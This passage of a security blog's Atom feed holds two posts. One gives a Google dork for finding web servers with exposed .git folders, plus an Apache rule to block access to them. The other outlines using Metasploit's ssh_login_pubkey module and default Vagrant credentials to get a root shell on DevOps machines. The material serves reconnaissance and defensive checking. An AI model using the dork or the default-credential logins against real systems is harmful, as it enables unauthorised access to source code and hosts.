&lt;img src=&quot;https://raw.githubusercontent.com/zer0trustsec/zer0trustsec.github.io/master/_posts/redteam-git-config-googledork/gdrkgit.png&quot; alt=&quot;Google dork&quot; /&gt;
&lt;figcaption&gt; Git folder google dork &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;h4 id=&quot;google-dork&quot;&gt;Google Dork:&lt;/h4&gt;
&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;intext:&quot;index of /.git&quot; &quot;parent directory&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;defend-git-folder-exposed-web-servers&quot;&gt;Defend .git folder exposed Web servers:&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&quot;language-cfg&quot;&gt;&amp;lt;Directory ~ “\.git”&amp;gt;
Order deny,allow
Deny from all
&amp;lt;/Directory&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;tools-used&quot;&gt;Tools used:&lt;/h4&gt;
&lt;p&gt;&lt;a href=&quot;https://www.google.com&quot;&gt;Google&lt;/a&gt;&lt;/p&gt;</content><author><name>Santhosh Baswa</name></author><category term="github" /><category term="googledork" /><category term="defense" /><summary type="html">As a part of OSINT/Recon activity to identify sensitive information for specific organisation/website most of the security engineers were using Google dorks. In this article we were identifying the vulnerable websites which exposes .git folders in their web servers.</summary></entry><entry><title type="html">DevOps Security - Scanning SSH keys for Weak credentials</title><link href="http://localhost:4000/devops-vagrant-default-cred-check/" rel="alternate" type="text/html" title="DevOps Security - Scanning SSH keys for Weak credentials" /><published>2017-02-21T21:00:00+07:00</published><updated>2017-02-21T21:00:00+07:00</updated><id>http://localhost:4000/devops-vagrant-default-cred-check</id><content type="html" xml:base="http://localhost:4000/devops-vagrant-default-cred-check/">&lt;p&gt;Most of the enterprise companies were migrating their infrastructure to cloud. They focused mainly on security in cloud, and DevOps teams were implementing CI/CD pipeline and integrating their tools with security tooling. In our article i would like to discuss to detect weak SSH credentials in DevOps environments using Metasploit tool.&lt;/p&gt;

&lt;h4 id=&quot;devops-environment---security-checks-ssh-keys&quot;&gt;DevOps Environment - Security Checks (SSH Keys):&lt;/h4&gt;

&lt;ol&gt;
  &lt;li&gt;Most of the DevOps environment VMs/Machines are using default credentials (vagrant/vagrant , root/vagrant)&lt;/li&gt;
  &lt;li&gt;Scanning the default SSH keys using metasploit - ssh_login_pubkey module.&lt;/li&gt;
  &lt;li&gt;Identify the weak SSH keys versions after the scan.&lt;/li&gt;
  &lt;li&gt;Login with Private key.&lt;/li&gt;
  &lt;li&gt;Get the vagrant/root shell.&lt;/li&gt;
&lt;/ol&gt;

&lt;h5 id=&quot;devops---ssh-weak-keys-scan&quot;&gt;DevOps - SSH weak keys scan:&lt;/h5&gt;

&lt;figure&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/zer0trustsec/zer0trustsec.github.io/master/_posts/devops-vagrant-default-cred-check/Vagrant_SSH.gif&quot; alt=&quot;DevOps - Security Checks&quot; /&gt;
&lt;figcaption&gt; Steps to Reproduce - DevSecOps (SSH Keys) &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;h4 id=&quot;tools-used&quot;&gt;Tools used:&lt;/h4&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/rapid7/metasploit-framework&quot;&gt;Metasploit&lt;/a&gt;&lt;/p&gt;</content><author><name>Santhosh Baswa</name></author><category term="Devops" /><category term="Security" /><category term="Metasploit" /><summary type="html">Most of the enterprise companies were migrating their infrastructure to cloud. They focused mainly on security in cloud, and DevOps teams were implementing CI/CD pipeline and integrating their tools with security tooling. In our article i would like to discuss to detect weak SSH credentials in DevOps environments using Metasploit tool.</summary></entry></feed>